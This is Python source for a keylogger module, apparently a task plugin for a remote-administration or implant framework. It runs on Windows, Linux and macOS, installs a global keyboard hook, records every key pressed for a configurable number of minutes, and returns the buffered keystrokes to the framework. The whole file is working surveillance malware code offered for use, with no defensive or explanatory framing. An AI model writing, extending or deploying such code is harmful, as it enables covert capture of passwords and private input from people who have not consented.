from tasks.__task import Task


class KeyLogger(Task):
    """Registers clicked keys."""
    platforms = ["win32", "linux", "darwin"]
    description = __doc__
    administrator = {"win32": False, "linux": True, "darwin": True}
    kwargs = {"buffer": {"type": int, "description": "Maximum length of one string of keys.", "default": 100},
              "log_time": {"type": int, "description": "Time to record pressed keys in minutes.", "default": 15}}
    packages = ["keyboard"]

    def __init__(self, task_id):
        super(KeyLogger, self).__init__(task_id)
        import logging
        import threading

        self.data = []
        self.buffer = ""

        self._logger = logging.getLogger(self.__class__.__name__)
        self._run = threading.Event()
        self.hook = None

    def run(self, **kwargs):
        assert "log_time" in kwargs, "Missing keyword agument log_time!"
        assert "buffer" in kwargs, "Missing keyword argument buffer!"

        log_time = int(kwargs.get("log_time"))
        buffer = int(kwargs.get("buffer"))

        assert log_time > 0, "Log time must be greater than 0!"
        assert buffer > 0, "Buffer must be greater than 0!"

        from queue import Queue, Empty
        import datetime
        import keyboard

        start_time = datetime.datetime.now()
        time_delta = datetime.timedelta(minutes=log_time)
        que = Queue(maxsize=1)
        self.hook = keyboard.hook(que.put)
        self._run.set()
        self._logger.info("Started KeyLogger task!")

        while self._run.is_set():
            try:
                event: keyboard.KeyboardEvent = que.get(timeout=1)
            except Empty:
                event = None

            if event and event.event_type == keyboard.KEY_DOWN:
                if keyboard.is_modifier(event.name) or event.name in ["enter", "space", "backspace", "delete", "tab"]:
                    event.name = " <" + event.name.upper() + "> "

                if len(self.buffer) >= buffer:
                    self.data.append(self.buffer)
                    self.buffer = ""
                else:
                    self.buffer = self.buffer + event.name

            if datetime.datetime.now() - start_time > time_delta:
                self.data.append(self.buffer)
                self.buffer = ""
                break
        return self.data

    def stop(self):
        from keyboard import unhook
        self._run.clear()
        unhook(self.hook)
        self.data.append(self.buffer)
        self.buffer = ""
